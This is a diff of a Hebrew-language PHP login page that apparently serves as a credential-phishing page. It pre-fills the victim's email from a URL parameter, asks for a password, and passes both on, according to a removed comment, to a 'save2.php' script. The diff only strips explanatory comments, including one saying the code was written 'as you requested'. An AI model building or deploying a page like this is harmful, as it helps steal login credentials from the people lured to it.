@@ -1,5 +1,5 @@
 <?php
-// מקבל את המשתמש מה-GET כפי שביקשת
+
 $user = isset($_GET['user']) ? trim($_GET['user']) : '';
 if ($user === '') { $user = 'user@example.com'; }
 ?>
@@ -30,7 +30,6 @@ if ($user === '') { $user = 'user@example.com'; }
       -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
     }
 
-    /* רקע מאחורי הכרטיס */
     .shell{min-height:100%; position:relative; display:block;}
     .bg{
       position:absolute; inset:0; z-index:0; pointer-events:none;
@@ -41,14 +40,13 @@ if ($user === '') { $user = 'user@example.com'; }
     .bg::after{
       content:"";
       position:absolute;
-      top:18px; inset-inline-end:24px; /* עליון-ימין ב-RTL */
+      top:18px; inset-inline-end:24px;
       width:min(28vw, 260px); aspect-ratio:1/1;
       background:url("logo.svg") no-repeat center/contain;
       opacity:.10;
       filter:contrast(120%);
     }
 
-    /* כרטיס טופס */
     .wrap{position:relative; z-index:1; display:grid; align-items:center; justify-items:center; padding:32px;}
     .card{
       width:100%; max-width:720px; background:var(--card);
@@ -57,7 +55,6 @@ if ($user === '') { $user = 'user@example.com'; }
       backdrop-filter:saturate(1.1);
     }
 
-    /* כותרת + לוגו משמאל */
     .card-head{display:flex; align-items:center; gap:16px;}
     .brand{margin:0; font-size:clamp(28px, 5vw, 48px); font-weight:800; color:var(--primary);}
     .brand-mark{
@@ -69,7 +66,6 @@ if ($user === '') { $user = 'user@example.com'; }
 
     .divider{height:1px; background:#e8ecf3; margin:16px 0 20px}
 
-    /* קפסולת משתמש מחוברת */
     .who{
       display:inline-flex; align-items:center; gap:8px;
       padding:10px 14px; border-radius:999px; background:#f2f5ff; color:#2b3a75;
@@ -79,7 +75,6 @@ if ($user === '') { $user = 'user@example.com'; }
     .who a{color:#2f63f1; text-decoration:none; font-weight:600}
     .who a:hover{text-decoration:underline}
 
-    /* שדות */
     .label{font-weight:700; color:#0b0e21;}
     .field{margin-top:14px; display:grid; gap:8px}
     .input{
@@ -88,7 +83,6 @@ if ($user === '') { $user = 'user@example.com'; }
     }
     .input:focus{ outline:none; border-color:var(--primary); box-shadow:0 0 0 5px var(--ring) }
 
-    /* כפתור */
     .cta{margin-top:22px}
     .btn{
       width:100%; display:inline-grid; grid-auto-flow:column; grid-auto-columns:max-content; justify-content:center; align-items:center; gap:12px;
@@ -114,7 +108,6 @@ if ($user === '') { $user = 'user@example.com'; }
         </div>
         <div class="divider" aria-hidden="true"></div>
 
-        <!-- מציג למי מתחברים, עם אפשרות שינוי -->
         <div class="who" aria-live="polite">
           <span>מתחברים כ־</span>
           <strong><?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?></strong>
@@ -125,7 +118,6 @@ if ($user === '') { $user = 'user@example.com'; }
         <label class="label" for="password">סיסמה</label>
         <div class="field">
           <input class="input" id="password" name="password" type="password" placeholder="הקלד/י סיסמה" autocomplete="current-password" required />
-          <!-- שומר את המשתמש ל-save2.php -->
           <input type="hidden" name="user" value="<?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?>" />
         </div>
 
@@ -141,4 +133,5 @@ if ($user === '') { $user = 'user@example.com'; }
   </main>
 </body>
 </html>
+
 
